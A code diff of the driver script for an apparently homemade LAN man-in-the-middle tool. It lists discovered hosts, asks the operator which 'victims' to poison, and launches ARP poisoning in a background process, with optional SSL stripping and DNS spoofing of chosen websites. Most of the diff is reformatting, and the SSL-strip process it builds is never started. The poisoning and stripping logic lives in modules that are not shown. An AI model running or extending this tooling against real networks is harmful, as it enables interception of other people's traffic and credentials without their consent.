@@ -1,6 +1,13 @@
-import arp, ssl, scan, parser
+import multiprocessing
+import arp
+import ssl
+import scan
+import parser
 from urllib.parse import urlparse
-import os, sys
+import os
+import sys
+
+sslRequested = False
 
 
 def is_valid_link(x):
@@ -38,14 +45,16 @@ def discover():
                 print("Do you want to poison all the hosts?")
                 answr = yes_no()
 
-                if answr == 0: # yes
+                if answr == 0:  # yes
                     print("Poisoning all hosts on the interface", interface)
-                else: #no
+                else:  # no
 
-                    print("The following hosts are up and running. Pick the number of the host(s) you want to poison:")
+                    print(
+                        "The following hosts are up and running. Pick the number of the host(s) you want to poison:")
                     counter = 1
                     for host in hosts:
-                        print("[", counter, "] Host with IP", host[0], "and MAC", host[1]) 
+                        print("[", counter, "] Host with IP",
+                              host[0], "and MAC", host[1])
                         counter += 1
 
                     index = list(map(int, input().split()))
@@ -54,9 +63,9 @@ def discover():
                     hosts = []
                     hosts = temp.copy()
 
-
         except Exception:
-            print("No hosts have been scanned in this interface. Configure some and try again.")
+            print(
+                "No hosts have been scanned in this interface. Configure some and try again.")
             sys.exit()
 
     return interface, hosts
@@ -73,7 +82,8 @@ def yes_no():
             return 0
         elif val.lower() == 'no' or val.lower() == 'n':
             return 1
-        else: return 2
+        else:
+            return 2
 
     answr = input()
     answr = input_checker(answr)
@@ -85,7 +95,6 @@ def yes_no():
     return answr
 
 
-
 interface, hosts = discover()
 args = parser.import_args()
 
@@ -94,16 +103,16 @@ if args.ARP:
     spacing()
 
     # some threads around here i guess
-    
+
     print("Want to do SSL strip on the victims while ARP poisoning them? Y/N")
     answr = yes_no()
 
     if answr is 0:
-        ssl = ssl.SSLStrip()
-        # begin ssl stripping
-        ssl.strip()
+        sslRequested = True
+        print("SSL Strip will be done")
     else:
-        print("Ok, no SSL strip.")
+        sslRequested = False
+        print("No SSL strip.")
 
     spacing()
 
@@ -122,7 +131,15 @@ if args.ARP:
 
     spacing()
 
-    arp.Poison(interface, hosts, interval).poison()
+    arpAttack = arp.Poison(interface, hosts, interval)
+    arpProcess = multiprocessing.Process(
+        target=arpAttack.poison, name="ARP Poison")
+    arpProcess.start()
+
+    if sslRequested == True:
+        ssl = ssl.SSLStrip()
+        sslProcess = multiprocessing.Process(
+            target=ssl.strip, name="SSL Strip")
 
 elif args.DNS:
     websites = args.DNS
